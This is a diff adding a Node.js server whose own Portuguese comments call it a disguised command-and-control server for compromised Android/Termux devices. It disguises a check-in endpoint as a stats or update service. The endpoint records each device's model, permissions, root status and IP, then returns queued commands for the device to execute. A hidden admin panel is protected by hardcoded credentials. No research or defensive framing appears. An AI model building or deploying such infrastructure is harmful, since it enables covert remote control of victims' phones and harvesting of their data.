@@ -1,0 +1,126 @@
+// server.js - Servidor C2 disfarçado
+const express = require('express');
+const crypto = require('crypto');
+const mongoose = require('mongoose');
+const bodyParser = require('body-parser');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+const app = express();
+
+// Configuração de segurança avançada
+app.use(helmet());
+app.use(bodyParser.json({ limit: '10kb' }));
+app.disable('x-powered-by');
+
+// Rate limiting personalizado
+const apiLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000,
+    max: 100,
+    message: "Too many requests"
+});
+
+// Conexão com MongoDB oculta
+mongoose.connect('mongodb://localhost:27017/termux_stats', {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+    connectTimeoutMS: 30000,
+    socketTimeoutMS: 30000
+});
+
+// Modelo de dados disfarçado
+const Device = mongoose.model('Device', new mongoose.Schema({
+    deviceId: { type: String, index: true, unique: true },
+    model: String,
+    androidVersion: Number,
+    appVersion: String,
+    permissions: [String],
+    isRooted: Boolean,
+    lastSeen: { type: Date, default: Date.now },
+    ip: String,
+    commands: [{
+        type: String,
+        executed: Boolean,
+        output: String
+    }]
+}));
+
+// Middleware de autenticação falsa
+const fakeAuth = (req, res, next) => {
+    const authToken = req.headers['x-termux-token'];
+    if (authToken === 'T3rmuXPr3m1um2023') {
+        next();
+    } else {
+        res.status(403).json({ status: "error", message: "Invalid token" });
+    }
+};
+
+// Rota de check-in (disfarçada)
+app.post('/api/v3/checkin', apiLimiter, fakeAuth, async (req, res) => {
+    try {
+        const encryptedData = req.body;
+        const decrypted = decryptData(encryptedData); // Implementar AES
+        
+        const { id, model, sdk, version, permissions, root } = JSON.parse(decrypted);
+        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+        await Device.findOneAndUpdate(
+            { deviceId: id },
+            { 
+                model,
+                androidVersion: sdk,
+                appVersion: version,
+                permissions,
+                isRooted: root,
+                lastSeen: new Date(),
+                ip
+            },
+            { upsert: true, new: true }
+        );
+
+        // Resposta com comandos pendentes
+        const device = await Device.findOne({ deviceId: id });
+        const pendingCommands = device?.commands?.filter(cmd => !cmd.executed) || [];
+
+        res.json({
+            status: "success",
+            updates: [],
+            security_patches: [],
+            commands: pendingCommands.map(cmd => ({
+                action: "cmd",
+                command: cmd.type
+            }))
+        });
+
+    } catch (e) {
+        res.status(400).json({ 
+            status: "error", 
+            message: "Invalid request",
+            updates: []
+        });
+    }
+});
+
+// Painel admin oculto (acesso básico)
+app.get('/.hidden-admin', (req, res) => {
+    const auth = { login: "termuxadmin", password: "T3rmuX@dmin2023!" };
+    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
+    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');
+
+    if (login === auth.login && password === auth.password) {
+        return res.sendFile(__dirname + '/hidden-admin.html');
+    }
+
+    res.set('WWW-Authenticate', 'Basic realm="Termux Statistics"');
+    return res.status(401).send('Authentication required');
+});
+
+// Inicia servidor
+const PORT = process.env.PORT || 443;
+app.listen(PORT, () => {
+    console.log(`Termux API Server running on port ${PORT}`);
+});
+
+function decryptData(data) {
+    // Implementação de decriptação AES
+    return "{}";
+}
